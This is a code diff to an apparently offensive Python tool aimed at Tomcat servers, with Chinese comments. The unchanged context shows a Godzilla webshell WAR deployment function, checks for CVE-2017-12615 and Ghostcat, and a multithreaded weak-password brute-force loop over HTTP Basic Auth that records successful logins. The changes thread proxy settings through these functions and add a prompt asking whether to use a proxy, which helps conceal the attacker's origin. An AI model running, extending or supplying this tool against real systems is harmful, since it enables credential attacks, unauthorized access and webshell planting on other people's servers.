@@ -238,7 +238,7 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
 
 
 # 弱口令检测函数
-def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
+def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config, proxies=None):
     """
     检测弱口令并记录成功登录的信息。
 
@@ -250,6 +250,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
         max_retries (int): 最大重试次数
         retry_delay (int): 重试延迟时间（秒）
         config (dict): 配置字典
+        proxies (dict, optional): 代理设置，格式为 {'http': 'http://10.10.1.10:3128', 'https': 'http://10.10.1.10:1080'}
 
     返回:
         tuple: 包含成功登录的URL、用户名和密码的元组
@@ -276,9 +277,9 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
             for username in usernames:
                 # 遍历密码列表
                 for password in passwords:
-                    # 发起GET请求，包含基本认证信息
+                    # 发起GET请求，包含基本认证信息和代理设置
                     response = requests.get(url=url_with_path, auth=HTTPBasicAuth(username, password), headers=headers,
-                                            timeout=10, verify=False)
+                                            timeout=10, verify=False, proxies=proxies)
                     # 如果登录成功
                     if response.status_code == 200:
                         # 记录成功登录的信息
@@ -321,6 +322,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
 
     # 如果没有成功登录，返回URL和None值
     return url, None, None
+
 
 
 # 动态调整线程池大小，确保资源使用合理
@@ -464,7 +466,7 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
 
 
 # 在每个URL上执行CVE-2017-12615、CNVD_2020_10487检测并继续进行弱口令检测
-def detect_and_check(url, usernames, passwords, output_file, config):
+def detect_and_check(url, usernames, passwords, output_file, config, proxies):
     """
     对给定URL进行漏洞检测，并记录结果。
 
@@ -474,6 +476,7 @@ def detect_and_check(url, usernames, passwords, output_file, config):
     - passwords: 密码列表。
     - output_file: 结果输出文件名。
     - config: 配置信息字典。
+    - proxies: 代理设置，格式为 {'http': 'http://10.10.1.10:3128', 'https': 'http://10.10.1.10:1080'}
     """
     # 先进行CVE-2017-12615检测
     success, vuln_type, exploit_url = check_cve_2017_12615_and_cnvd_2020_10487(url, config)
@@ -487,7 +490,10 @@ def detect_and_check(url, usernames, passwords, output_file, config):
     check_weak_password(url, usernames, passwords, output_file,
                         config['retry']['check_weak_password']['max_retries'],
                         config['retry']['check_weak_password']['retry_delay'],
-                        config)
+                        config,
+                        proxies)
+
+
 
 
 # 主函数
@@ -501,6 +507,24 @@ def main():
     # 验证配置文件
     if not validate_config(config):
         return
+
+    # 提示用户是否使用代理
+    while True:
+        use_proxy_input = input("是否使用代理？(Y/N): ").strip().upper()
+        if use_proxy_input in ['Y', 'N']:
+            break
+        else:
+            logger.warning(f"{Fore.RED}输入无效，请输入 Y 或 N。")
+
+    if use_proxy_input == 'Y':
+        proxies = config.get('proxies', None)
+        if not proxies:
+            logger.error("配置文件中未找到代理设置。")
+            return
+        logger.info(f"{Fore.GREEN}使用代理: {proxies}")
+    else:
+        proxies = None
+        logger.info(f"{Fore.GREEN}不使用代理")
 
     # 加载 URL、用户名和密码文件
     urls = load_file(config['files']['url_file'])
@@ -522,7 +546,7 @@ def main():
     # 使用线程池执行检测任务
     with ThreadPoolExecutor(max_workers=workers) as executor:
         futures = [
-            executor.submit(detect_and_check, url, usernames, passwords, output_file, config) for url in urls
+            executor.submit(detect_and_check, url, usernames, passwords, output_file, config, proxies) for url in urls
         ]
 
         # 等待所有任务完成
